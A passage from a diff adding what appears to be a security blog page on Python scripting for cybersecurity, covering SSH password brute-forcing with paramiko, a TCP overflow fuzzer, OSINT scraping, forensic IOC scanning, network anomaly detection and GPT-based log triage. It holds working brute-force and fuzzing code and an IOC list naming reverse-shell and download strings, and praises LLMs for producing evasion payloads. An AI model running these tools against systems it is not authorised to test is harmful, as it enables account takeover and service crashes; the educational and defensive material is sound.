+                       password=password, timeout=timeout,
+                       banner_timeout=timeout)
+        <span style="color:#bd93f9">return</span> <span style="color:#bd93f9">True</span>
+    <span style="color:#bd93f9">except</span> paramiko.AuthenticationException:
+        <span style="color:#bd93f9">return</span> <span style="color:#bd93f9">False</span>
+    <span style="color:#bd93f9">except</span> Exception <span style="color:#bd93f9">as</span> e:
+        <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  [!] Connection error: {e}"</span>)
+        <span style="color:#bd93f9">return</span> <span style="color:#bd93f9">False</span>
+    <span style="color:#bd93f9">finally</span>:
+        client.close()
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">ssh_brute</span>(ip, username, wordlist_path):
+    words = Path(wordlist_path).read_text().splitlines()
+    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"[*] Testing {len(words)} passwords for {username}@{ip}"</span>)
+    <span style="color:#bd93f9">for</span> pw <span style="color:#bd93f9">in</span> words:
+        pw = pw.strip()
+        <span style="color:#bd93f9">if not</span> pw: <span style="color:#bd93f9">continue</span>
+        <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  [-] Trying: {pw}"</span>, end=<span style="color:#ff79c6">''</span>)
+        <span style="color:#bd93f9">if</span> try_ssh(ip, username, pw):
+            <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"
+  [FOUND] {username}:{pw}"</span>)
+            <span style="color:#bd93f9">return</span> pw
+    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">"
+  [-] Exhausted wordlist -- no match found"</span>)
+    <span style="color:#bd93f9">return</span> <span style="color:#bd93f9">None</span>
+
+<span style="color:var(--t3)"># ssh_brute("192.168.1.10", "root", "/usr/share/wordlists/rockyou.txt")</span>
+
+<span style="color:var(--t3)"># ── BUFFER OVERFLOW FUZZER (pwntools-style) ──────────</span>
+<span style="color:#bd93f9">import</span> socket
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">fuzz_tcp</span>(host, port, step=100, maxsize=5000):
+    size = step
+    <span style="color:#bd93f9">while</span> size <= maxsize:
+        payload = <span style="color:#ff79c6">b"A"</span> * size
+        <span style="color:#bd93f9">try</span>:
+            s = socket.socket()
+            s.settimeout(3)
+            s.connect((host, port))
+            s.send(payload + <span style="color:#ff79c6">b"
+"</span>)
+            <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  [SENT] {size} bytes -- alive"</span>)
+            s.close()
+        <span style="color:#bd93f9">except</span>:
+            <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  [CRASH] Service down at {size} bytes"</span>)
+            <span style="color:#bd93f9">return</span> size
+        size += step
+    <span style="color:#bd93f9">return</span> <span style="color:#bd93f9">None</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<section class="sec rv" id="osint">
+  <div class="sec-hd"><span class="sec-n">04 //</span><h2 class="sec-t">OSINT &amp; Web Intelligence Gathering<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Python's <strong style="color:var(--c)">requests</strong> and <strong style="color:var(--c)">BeautifulSoup</strong> combination is the most widely used web scraping stack in OSINT work. It handles HTTP/HTTPS with custom headers and session management, parses HTML into a navigable tree structure, and extracts structured data with CSS selectors or tag searches. For authorised recon, Python OSINT scripts can systematically extract emails, subdomains, employee names, technology fingerprints, and link graphs from target web properties.</p>
+  </div>
+  <div class="cb rv" data-l="Python OSINT -- Web Intel, Email and Link Extraction">
+    <code><span style="color:var(--t3)"># Web Intelligence Gatherer
+# Extracts emails, links, comments, and technology from a target URL</span>
+<span style="color:#bd93f9">import</span> requests, re
+<span style="color:#bd93f9">from</span> bs4 <span style="color:#bd93f9">import</span> BeautifulSoup
+<span style="color:#bd93f9">from</span> urllib.parse <span style="color:#bd93f9">import</span> urljoin, urlparse
+
+<span style="color:var(--t3)"># Stealth headers to avoid bot detection</span>
+HEADERS = {
+    <span style="color:#ff79c6">"User-Agent"</span>: <span style="color:#ff79c6">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"</span>,
+    <span style="color:#ff79c6">"Accept-Language"</span>: <span style="color:#ff79c6">"en-US,en;q=0.9"</span>,
+}
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">get_intel</span>(url):
+    r = requests.get(url, headers=HEADERS, timeout=15, allow_redirects=<span style="color:#bd93f9">True</span>)
+    soup = BeautifulSoup(r.text, <span style="color:#ff79c6">"html.parser"</span>)
+
+    <span style="color:var(--t3)"># Server fingerprinting</span>
+    server  = r.headers.get(<span style="color:#ff79c6">"Server"</span>, <span style="color:#ff79c6">"hidden"</span>)
+    powered = r.headers.get(<span style="color:#ff79c6">"X-Powered-By"</span>, <span style="color:#ff79c6">"hidden"</span>)
+    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"[+] Server: {server} | X-Powered-By: {powered}"</span>)
+
+    <span style="color:var(--t3)"># Extract all email addresses from page text</span>
+    emails = <span style="color:#8be9fd">set</span>(re.findall(
+        <span style="color:#ffa07a">r'[\w.+\-]+@[\w\-]+\.(?:com|org|net|io|gov|co\.uk)'</span>, r.text, re.I))
+    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"
+[+] Emails ({len(emails)}):"</span>)
+    <span style="color:#bd93f9">for</span> e <span style="color:#bd93f9">in</span> <span style="color:#8be9fd">sorted</span>(emails): <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  {e}"</span>)
+
+    <span style="color:var(--t3)"># Extract hyperlinks (absolute)</span>
+    links = <span style="color:#8be9fd">set</span>()
+    <span style="color:#bd93f9">for</span> tag <span style="color:#bd93f9">in</span> soup.find_all(<span style="color:#ff79c6">"a"</span>, href=<span style="color:#bd93f9">True</span>):
+        links.add(urljoin(url, tag[<span style="color:#ff79c6">"href"</span>]))
+    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"
+[+] Links found: {len(links)}"</span>)
+
+    <span style="color:var(--t3)"># HTML comments (may contain dev notes or credentials)</span>
+    comments = soup.find_all(string=<span style="color:#bd93f9">lambda</span> t: <span style="color:#8be9fd">isinstance</span>(t, str) <span style="color:#bd93f9">and</span>
+                             <span style="color:#ff79c6">'&lt;!--'</span> <span style="color:#bd93f9">in</span> <span style="color:#8be9fd">str</span>(t))
+    <span style="color:#bd93f9">if</span> comments:
+        <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">"
+[!] HTML comments:"</span>)
+        <span style="color:#bd93f9">for</span> c <span style="color:#bd93f9">in</span> comments: <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  {str(c)[:120]}"</span>)
+
+    <span style="color:var(--t3)"># Meta tags (technology, author, generator)</span>
+    <span style="color:#bd93f9">for</span> meta <span style="color:#bd93f9">in</span> soup.find_all(<span style="color:#ff79c6">"meta"</span>):
+        name = meta.get(<span style="color:#ff79c6">"name"</span>, <span style="color:#ff79c6">""</span>).lower()
+        <span style="color:#bd93f9">if</span> name <span style="color:#bd93f9">in</span> (<span style="color:#ff79c6">"generator"</span>, <span style="color:#ff79c6">"author"</span>, <span style="color:#ff79c6">"description"</span>):
+            <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  [META] {name}: {meta.get('content','')}"</span>)
+
+get_intel(<span style="color:#ff79c6">"https://example.com"</span>)</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<section class="sec rv" id="forensics">
+  <div class="sec-hd"><span class="sec-n">05 //</span><h2 class="sec-t">Digital Forensics with Python<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Python is a core tool in digital forensics -- for file hashing and IOC matching, log timeline reconstruction, memory analysis via Volatility3, and parsing forensic artefact formats (Windows Registry, prefetch, event logs). Python forensics scripts enable rapid triage on compromised systems before full toolset deployment, and automate the repetitive analysis tasks that would take forensic analysts hours to do manually.</p>
+  </div>
+  <div class="cb rv" data-l="Python Forensics -- File Hashing, IOC Scanning and Log Analysis">
+    <code><span style="color:var(--t3)"># File hashing and IOC matching</span>
+<span style="color:#bd93f9">import</span> hashlib, os, json
+<span style="color:#bd93f9">from</span> pathlib <span style="color:#bd93f9">import</span> Path
+
+KNOWN_BAD = {
+    <span style="color:#ff79c6">"44d88612fea8a8f36de82e1278abb02f"</span>: <span style="color:#ff79c6">"EICAR test file"</span>,
+    <span style="color:#ff79c6">"d8e8fca2dc0f896fd7cb4cb0031ba249"</span>: <span style="color:#ff79c6">"Suspicious binary"</span>,
+}
+IOC_STRINGS = [<span style="color:#ff79c6">b"base64_decode"</span>, <span style="color:#ff79c6">b"eval($_POST"</span>, <span style="color:#ff79c6">b"wget http"</span>,
+               <span style="color:#ff79c6">b"chmod 777"</span>, <span style="color:#ff79c6">b"/bin/sh -i"</span>, <span style="color:#ff79c6">b"nohup"</span>]
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">hash_file</span>(path):
+    h = hashlib.md5()
+    <span style="color:#bd93f9">with</span> <span style="color:#8be9fd">open</span>(path, <span style="color:#ff79c6">"rb"</span>) <span style="color:#bd93f9">as</span> f:
+        <span style="color:#bd93f9">for</span> chunk <span style="color:#bd93f9">in</span> <span style="color:#8be9fd">iter</span>(<span style="color:#bd93f9">lambda</span>: f.read(8192), <span style="color:#ff79c6">b""</span>):
+            h.update(chunk)
+    <span style="color:#bd93f9">return</span> h.hexdigest()
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">scan_dir</span>(directory):
+    results = []
+    <span style="color:#bd93f9">for</span> root, _, files <span style="color:#bd93f9">in</span> os.walk(directory):
+        <span style="color:#bd93f9">for</span> fname <span style="color:#bd93f9">in</span> files:
+            fp = Path(root) / fname
+            <span style="color:#bd93f9">try</span>:
+                md5 = hash_file(fp)
+                data = fp.read_bytes()
+                ioc_hits = [s.decode() <span style="color:#bd93f9">for</span> s <span style="color:#bd93f9">in</span> IOC_STRINGS <span style="color:#bd93f9">if</span> s <span style="color:#bd93f9">in</span> data]
+                <span style="color:#bd93f9">if</span> md5 <span style="color:#bd93f9">in</span> KNOWN_BAD:
+                    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"[HASH IOC] {fp} -- {KNOWN_BAD[md5]}"</span>)
+                <span style="color:#bd93f9">if</span> ioc_hits:
+                    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"[PATTERN] {fp} -- {', '.join(ioc_hits)}"</span>)
+                results.append({<span style="color:#ff79c6">"file"</span>:<span style="color:#8be9fd">str</span>(fp),<span style="color:#ff79c6">"md5"</span>:md5,<span style="color:#ff79c6">"iocs"</span>:ioc_hits})
+            <span style="color:#bd93f9">except</span>: <span style="color:#bd93f9">pass</span>
+    <span style="color:#bd93f9">return</span> results
+
+<span style="color:var(--t3)"># ── AUTH LOG PARSER ───────────────────────────────────</span>
+<span style="color:#bd93f9">import</span> re
+<span style="color:#bd93f9">from</span> collections <span style="color:#bd93f9">import</span> Counter
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">parse_auth_log</span>(path=<span style="color:#ff79c6">"/var/log/auth.log"</span>, threshold=5):
+    failures = Counter()
+    <span style="color:#bd93f9">with</span> <span style="color:#8be9fd">open</span>(path) <span style="color:#bd93f9">as</span> f:
+        <span style="color:#bd93f9">for</span> line <span style="color:#bd93f9">in</span> f:
+            m = re.search(<span style="color:#ffa07a">r'Failed password for (?:invalid user )?(\S+) from ([\d.]+)'</span>, line)
+            <span style="color:#bd93f9">if</span> m: failures[m.group(2)] += 1
+    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">"
+=== BRUTE FORCE REPORT ==="</span>)
+    <span style="color:#bd93f9">for</span> ip, count <span style="color:#bd93f9">in</span> failures.most_common(10):
+        <span style="color:#bd93f9">if</span> count >= threshold:
+            <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  [ALERT] {ip:<18} {count} failures"</span>)</code>
+  </div>
+  <div class="tgrid rv">
+    <div class="tc"><div class="tcname">hashlib</div><span class="tctag">Built-in</span><div class="tcdesc">MD5, SHA1, SHA256 file hashing for IOC matching and integrity verification</div></div>
+    <div class="tc"><div class="tcname">scapy</div><span class="tctag">Network</span><div class="tcdesc">Packet crafting, capture, ARP scanning, custom protocol probing</div></div>
+    <div class="tc"><div class="tcname">paramiko</div><span class="tctag">SSH</span><div class="tcdesc">SSH2 protocol client for remote execution and auth testing on authorised systems</div></div>
+    <div class="tc"><div class="tcname">requests</div><span class="tctag">HTTP</span><div class="tcdesc">HTTP/HTTPS client with session management for web scraping and API interaction</div></div>
+    <div class="tc"><div class="tcname">beautifulsoup4</div><span class="tctag">Parsing</span><div class="tcdesc">HTML/XML parser for structured web intelligence extraction and OSINT</div></div>
+    <div class="tc"><div class="tcname">impacket</div><span class="tctag">Windows</span><div class="tcdesc">SMB, NTLM, Kerberos protocol implementation for AD attack automation</div></div>
+    <div class="tc"><div class="tcname">pwntools</div><span class="tctag">Exploit</span><div class="tcdesc">Binary exploitation framework with overflow helpers, ROP chains, shellcode</div></div>
+    <div class="tc"><div class="tcname">volatility3</div><span class="tctag">Forensics</span><div class="tcdesc">Memory forensics framework for process, network, and malware artefact extraction</div></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<section class="sec rv" id="defence">
+  <div class="sec-hd"><span class="sec-n">06 //</span><h2 class="sec-t">Defensive Security Scripting<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Python's strengths in defensive security are equally significant -- automating threat detection, building real-time monitoring tools, parsing and correlating logs, and integrating with SIEM and SOAR platforms via APIs. The same libraries used offensively (scapy for packet crafting) are equally powerful defensively (scapy for live packet capture and anomaly detection). Python's ability to glue together disparate security tools through their CLIs and APIs makes it the dominant automation language in Security Operations Centres.</p>
+  </div>
+  <div class="cb rv" data-l="Python Defensive -- Real-Time Monitor and Threat Detection">
+    <code><span style="color:var(--t3)"># Real-time network anomaly detector using scapy sniff()</span>
+<span style="color:#bd93f9">import</span> scapy.all <span style="color:#bd93f9">as</span> scapy
+<span style="color:#bd93f9">from</span> collections <span style="color:#bd93f9">import</span> defaultdict, Counter
+<span style="color:#bd93f9">import</span> time
+
+connection_counts = defaultdict(Counter)
+THRESHOLD_SYN  = 50   <span style="color:var(--t3)"># SYN packets per IP in window -- SYN flood indicator</span>
+THRESHOLD_PORT = 20   <span style="color:var(--t3)"># Unique ports per IP -- port scan indicator</span>
+seen_ports     = defaultdict(set)
+window_start   = time.time()
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">packet_callback</span>(pkt):
+    <span style="color:#bd93f9">global</span> window_start
+    <span style="color:#bd93f9">if</span> <span style="color:#bd93f9">not</span> pkt.haslayer(scapy.TCP): <span style="color:#bd93f9">return</span>
+
+    src = pkt[scapy.IP].src <span style="color:#bd93f9">if</span> pkt.haslayer(scapy.IP) <span style="color:#bd93f9">else</span> <span style="color:#ff79c6">"unknown"</span>
+    dport = pkt[scapy.TCP].dport
+    flags = pkt[scapy.TCP].flags
+
+    <span style="color:var(--t3"># Track SYN packets per source</span>
+    <span style="color:#bd93f9">if</span> flags == 0x02:   <span style="color:var(--t3)"># SYN flag</span>
+        connection_counts[src][<span style="color:#ff79c6">"syn"</span>] += 1
+        seen_ports[src].add(dport)
+
+    <span style="color:var(--t3)"># Alert on SYN flood</span>
+    <span style="color:#bd93f9">if</span> connection_counts[src][<span style="color:#ff79c6">"syn"</span>] > THRESHOLD_SYN:
+        <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"[ALERT] SYN flood from {src}: {connection_counts[src]['syn']} SYNs"</span>)
+        connection_counts[src][<span style="color:#ff79c6">"syn"</span>] = 0
+
+    <span style="color:var(--t3)"># Alert on port scan</span>
+    <span style="color:#bd93f9">if</span> <span style="color:#8be9fd">len</span>(seen_ports[src]) > THRESHOLD_PORT:
+        <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"[ALERT] Port scan from {src}: {len(seen_ports[src])} unique ports"</span>)
+        seen_ports[src].clear()
+
+    <span style="color:var(--t3)"># Reset counters every 60 seconds</span>
+    <span style="color:#bd93f9">if</span> time.time() - window_start > 60:
+        connection_counts.clear()
+        window_start = time.time()
+
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">"[*] Starting real-time network monitor... Ctrl+C to stop"</span>)
+scapy.sniff(prn=packet_callback, store=<span style="color:#bd93f9">False</span>, filter=<span style="color:#ff79c6">"tcp"</span>)</code>
+  </div>
+</section>
+
+<div class="div div-ai"></div>
+
+<section class="sec rv sec-ai" id="ai">
+  <div class="sec-hd"><span class="sec-n">07 //</span><h2 class="sec-t">AI Integration in Python Security Scripting<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel panel-ai rv-l">
+    <p>Python and AI are natural partners -- the OpenAI, Anthropic, and LangChain libraries make it trivial to integrate GPT-4 and Claude into security scripts. Python's dominance as the language of both machine learning and cybersecurity means AI-powered security tooling is almost always built in Python first. The most powerful pattern combines Python's speed and API access with LLM reasoning: Python collects and structures raw security data at machine scale, then GPT or Claude analyses patterns, correlates events, and produces actionable threat intelligence that purely automated rule-based systems cannot generate.</p>
+  </div>
+  <div class="alert al-p rv">
+    <span class="al-ic">[ AI ]</span>
+    <p class="al-tx">Security teams using Python + AI pipelines report detecting attack patterns 3-5x faster than rule-based detection alone. LLMs reason about attack chains across multiple log sources simultaneously, identifying the subtle correlations between a reconnaissance event on Day 1, a credential theft on Day 3, and lateral movement on Day 7 that no individual SIEM rule would catch.</p>
+  </div>
+  <div class="ai-grid rv">
+    <div class="ai-card"><span class="ai-ico">&#9999;&#65039;</span><div class="ai-name">Script Generation</div><div class="ai-desc">LLMs generate complete Python security scripts from plain English -- "write a Python script that uses scapy to detect ARP spoofing on the local network, logs attacker MAC and IP pairs to a JSON file, and sends a Slack alert when an attack is detected." Produces production-quality scripts with error handling, logging, and proper library usage in seconds.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128269;</span><div class="ai-name">Log Intelligence</div><div class="ai-desc">Python parses and structures raw log data at machine speed; GPT analyses the structured output for attack patterns invisible to rule-based detection. The pipeline: Python extracts events to JSON, GPT correlates across time windows and produces narrative threat intelligence -- "this sequence indicates a low-and-slow credential stuffing transitioning to privilege escalation at 03:41 UTC."</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128272;</span><div class="ai-name">Malware Deobfuscation</div><div class="ai-desc">LLMs analyse and explain obfuscated Python malware -- base64 encoded payloads, eval chains, compressed code, and hex-encoded strings. Paste obfuscated code and receive a plain-English explanation of what it does, what network connections it makes, what persistence mechanisms it uses, and what detection rules would catch it.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128201;</span><div class="ai-name">Vulnerability Research</div><div class="ai-desc">AI accelerates CVE analysis and PoC development for authorised research -- explaining vulnerability root causes from CVE descriptions, generating proof-of-concept exploit skeletons, and identifying similar vulnerability patterns across codebases. Dramatically reduces the time from CVE publication to working understanding for security engineers.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128736;&#65039;</span><div class="ai-name">SOAR Automation</div><div class="ai-desc">Python + LLM combinations power next-generation SOAR (Security Orchestration, Automation and Response) -- AI decides which response playbook to execute based on alert context, drafts incident reports, queries threat intelligence feeds, and suggests containment actions. Python orchestrates the API calls; GPT provides the contextual judgement that pure rule engines lack.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128308;</span><div class="ai-name">Red Team Acceleration</div><div class="ai-desc">For authorised engagements, LLMs accelerate Python exploit development -- generating custom payload variants, evasion techniques, and post-exploitation scripts tailored to the target environment. Also generates detection rules for every technique it creates, enabling direct red-to-blue knowledge transfer for purple team exercises and improving defensive coverage immediately.</div></div>
+  </div>
+  <div class="panel panel-ai rv" style="margin-top:28px">
+    <div class="panel-t">AI Tools for Python Security Scripting</div>
+    <table class="ptbl">
+      <thead><tr>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Tool</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Capability</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Python Security Use Case</th>
+      </tr></thead>
+      <tbody>
+        <tr><td style="color:var(--g)">GPT-4 / Claude</td><td style="color:var(--t2)">Script generation, log analysis, malware explanation</td><td style="color:var(--t2)">Generate complete security scripts; analyse threat data; deobfuscate malware</td></tr>
+        <tr><td style="color:var(--g)">GitHub Copilot</td><td style="color:var(--t2)">Inline code completion</td><td style="color:var(--t2)">Autocomplete scapy filters, regex patterns, and API calls in VS Code</td></tr>
+        <tr><td style="color:var(--g)">LangChain</td><td style="color:var(--t2)">LLM orchestration framework</td><td style="color:var(--t2)">Chain multiple AI calls into threat intelligence pipelines with memory and tools</td></tr>
+        <tr><td style="color:var(--g)">Python + OpenAI</td><td style="color:var(--t2)">Direct API integration</td><td style="color:var(--t2)">Build custom security AI tools -- log analysers, alert triage, report generators</td></tr>
+        <tr><td style="color:var(--g)">Semgrep + AI</td><td style="color:var(--t2)">AI-assisted SAST</td><td style="color:var(--t2)">AI-augmented static analysis of Python codebases for injection, crypto, and logic flaws</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="cb cb-ai rv" data-l="AI Pipeline -- Python Log Collection + GPT Threat Analysis">
+    <code><span style="color:var(--t3)"># Two-stage pipeline: Python structures log data, GPT analyses it
+# Run: python3 pipeline.py /var/log/auth.log</span>
+<span style="color:#bd93f9">import</span> re, json, sys, openai
+<span style="color:#bd93f9">from</span> collections <span style="color:#bd93f9">import</span> Counter
+<span style="color:#bd93f9">from</span> pathlib <span style="color:#bd93f9">import</span> Path
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">parse_log</span>(path):
+    text = Path(path).read_text(errors=<span style="color:#ff79c6">"ignore"</span>)
+    failures, successes, sudo = Counter(), [], []
+    <span style="color:#bd93f9">for</span> line <span style="color:#bd93f9">in</span> text.splitlines():
+        m = re.search(<span style="color:#ffa07a">r'Failed password for (?:invalid user )?(\S+) from ([\d.]+)'</span>, line)
+        <span style="color:#bd93f9">if</span> m: failures[m.group(2)] += 1
+        m = re.search(<span style="color:#ffa07a">r'Accepted \S+ for (\S+) from ([\d.]+)'</span>, line)
+        <span style="color:#bd93f9">if</span> m: successes.append({<span style="color:#ff79c6">"user"</span>:m.group(1),<span style="color:#ff79c6">"ip"</span>:m.group(2)})
+        m = re.search(<span style="color:#ffa07a">r'sudo:.*USER=(\S+).*COMMAND=(.*)'</span>, line)
+        <span style="color:#bd93f9">if</span> m: sudo.append({<span style="color:#ff79c6">"user"</span>:m.group(1),<span style="color:#ff79c6">"cmd"</span>:m.group(2).strip()})
+    <span style="color:#bd93f9">return</span> {
+        <span style="color:#ff79c6">"total_failures"</span>  : <span style="color:#8be9fd">sum</span>(failures.values()),
+        <span style="color:#ff79c6">"unique_attackers"</span>: <span style="color:#8be9fd">len</span>(failures),
+        <span style="color:#ff79c6">"top_ips"</span>         : failures.most_common(5),
+        <span style="color:#ff79c6">"successful_logins"</span>: successes[-20:],
+        <span style="color:#ff79c6">"sudo_commands"</span>   : sudo[-10:],
+    }
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">analyse_with_gpt</span>(data):
+    prompt = (
+        <span style="color:#ff79c6">"You are a senior Linux security analyst. Analyse this auth.log "
+        "data and provide a structured threat assessment.
+
+"</span>
+        <span style="color:#ff79c6">"Data:
+"</span> + json.dumps(data, indent=2) + <span style="color:#ff79c6">"
+
+"</span>
+        <span style="color:#ff79c6">"Provide:
+"</span>
+        <span style="color:#ff79c6">"1. THREAT CLASSIFICATION - attack type
+"</span>
+        <span style="color:#ff79c6">"2. ATTACK TIMELINE - sequence of events
+"</span>
+        <span style="color:#ff79c6">"3. SUCCESS ASSESSMENT - did attacker succeed?
+"</span>
+        <span style="color:#ff79c6">"4. IMMEDIATE ACTIONS - next 30 minutes
+"</span>
+        <span style="color:#ff79c6">"5. BLOCKING RULES - specific firewall/fail2ban commands"</span>
+    )
+    r = openai.OpenAI().chat.completions.create(
+        model=<span style="color:#ff79c6">"gpt-4o"</span>,
+        messages=[{<span style="color:#ff79c6">"role"</span>:<span style="color:#ff79c6">"user"</span>,<span style="color:#ff79c6">"content"</span>:prompt}]
+    )
+    <span style="color:#bd93f9">return</span> r.choices[0].message.content
+
+log_path = sys.argv[1] <span style="color:#bd93f9">if</span> <span style="color:#8be9fd">len</span>(sys.argv) > 1 <span style="color:#bd93f9">else</span> <span style="color:#ff79c6">"/var/log/auth.log"</span>
+data = parse_log(log_path)
+<span style="color:#8be9fd">print</span>(analyse_with_gpt(data))</code>
+  </div>
+  <div class="cb cb-ai rv" data-l="AI -- Python Real-Time Alert Triage with GPT">
+    <code><span style="color:var(--t3)"># Real-time SIEM alert triage: Python receives alerts, GPT decides priority</span>
+<span style="color:#bd93f9">import</span> openai, json
+<span style="color:#bd93f9">from</span> dataclasses <span style="color:#bd93f9">import</span> dataclass
+
+<span style="color:#bd93f9">@dataclass</span>
+<span style="color:#8be9fd">class</span> Alert:
+    source_ip: str
+    event_type: str
+    details: str
+    timestamp: str
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">triage_alert</span>(alert: Alert) -> dict:
+    prompt = (
+        <span style="color:#ff79c6">"You are a SOC analyst. Triage this security alert and respond "
+        "ONLY with JSON: {severity, action, rationale}
+
+"</span>
+        <span style="color:#ff79c6">f"Alert: {json.dumps(alert.__dict__, indent=2)}"</span>
+    )
+    r = openai.OpenAI().chat.completions.create(
+        model=<span style="color:#ff79c6">"gpt-4o"</span>,
+        messages=[{<span style="color:#ff79c6">"role"</span>:<span style="color:#ff79c6">"user"</span>,<span style="color:#ff79c6">"content"</span>:prompt}],
+        response_format={<span style="color:#ff79c6">"type"</span>:<span style="color:#ff79c6">"json_object"</span>}
+    )
+    <span style="color:#bd93f9">return</span> json.loads(r.choices[0].message.content)
+
+<span style="color:var(--t3)"># Example: triage an incoming SIEM alert</span>
+alert = Alert(
+    source_ip=<span style="color:#ff79c6">"203.0.113.42"</span>,
+    event_type=<span style="color:#ff79c6">"SSH_BRUTE_FORCE"</span>,
+    details=<span style="color:#ff79c6">"847 failed logins in 3 minutes, then success at 03:41 UTC"</span>,
+    timestamp=<span style="color:#ff79c6">"2024-11-15T03:41:07Z"</span>
+)
+result = triage_alert(alert)
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"Severity : {result['severity']}"</span>)
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"Action   : {result['action']}"</span>)
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"Rationale: {result['rationale']}"</span>)</code>
+  </div>
+</section>
+
+<div class="cta rv">
+  <div class="cta-t">// import security; import ai //</div>
+  <p class="cta-p">Python sits at the intersection of offensive security, defensive automation, and artificial intelligence. Mastering Python scripting for cybersecurity means mastering the language that powers modern penetration testing frameworks, security orchestration platforms, and AI-driven threat detection. The combination of Python's library ecosystem and LLM integration is the most powerful productivity multiplier available to security professionals today.</p>
+  <div class="cta-btns">
+    <a href="https://github.com/nishu2402" class="btn btn-p" target="_blank" rel="noopener">GitHub -- nishu2402</a>
+    <a href="https://nishu2402.github.io" class="btn btn-s" target="_blank" rel="noopener">View Portfolio</a>
+  </div>
+</div>
+<footer class="footer">
+  <div class="f-l">Nisarg Chasmawala (Shroff)<br><span class="f-alias">// HEAVEN</span></div>
+  <div class="f-r">Offensive Security Engineer &middot; MSc Cyber Security, BCU<br>CEH Master &middot; CPENT &middot; CHFI &middot; ISO 27001 Lead Auditor<br><a href="https://github.com/nishu2402" target="_blank" rel="noopener">github.com/nishu2402</a></div>
+</footer>
+</div>
+<script>
+var cur=document.getElementById('cur'),
+    cur2=document.getElementById('cur2'),
+    cur3=document.getElementById('cur3');
+var mx=0,my=0;
+document.addEventListener('mousemove',function(e){
+  mx=e.clientX;my=e.clientY;
+  cur.style.left=mx+'px';cur.style.top=my+'px';
+});
+(function loop(){
+  cur2.style.left=mx+'px';cur2.style.top=my+'px';
+  cur3.style.left=mx+'px';cur3.style.top=my+'px';
+  requestAnimationFrame(loop);
+})();
+document.querySelectorAll('a,.btn,.ai-card,.panel,.cb,.tc').forEach(function(el){
+  el.addEventListener('mouseenter',function(){cur.style.width='18px';cur.style.height='18px';cur.style.background='rgba(0,255,65,.25)';});
+  el.addEventListener('mouseleave',function(){cur.style.width='10px';cur.style.height='10px';cur.style.background='var(--g)';});
+});
+window.addEventListener('scroll',function(){
+  document.getElementById('prog').style.width=((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)+'%';
+});
+(function(){
+  var c=document.getElementById('bg-particle'),ctx=c.getContext('2d');
+  var W,H,mX=innerWidth/2,mY=innerHeight/2,N=200,MAX=140,P=[];
+  function Pt(){this.reset(true);}
+  Pt.prototype.reset=function(i){this.x=Math.random()*W;this.y=i?Math.random()*H:H+10;this.z=Math.random()*3+.5;this.vx=(Math.random()-.5)*.4;this.vy=(Math.random()-.5)*.4-.1;this.life=Math.random()*300+200;this.maxLife=this.life;this.r=Math.random()*1.5+.5;var r=Math.random();this.color=r<.7?'0,255,65':r<.9?'0,229,255':'191,0,255';};
+  Pt.prototype.update=function(){var dx=this.x-mX,dy=this.y-mY,d=Math.sqrt(dx*dx+dy*dy);if(d<120){var f=(120-d)/120;this.vx+=dx/d*f*.6;this.vy+=dy/d*f*.6;}this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life--;if(this.life<=0||this.x<-50||this.x>W+50||this.y<-50||this.y>H+50)this.reset(false);};
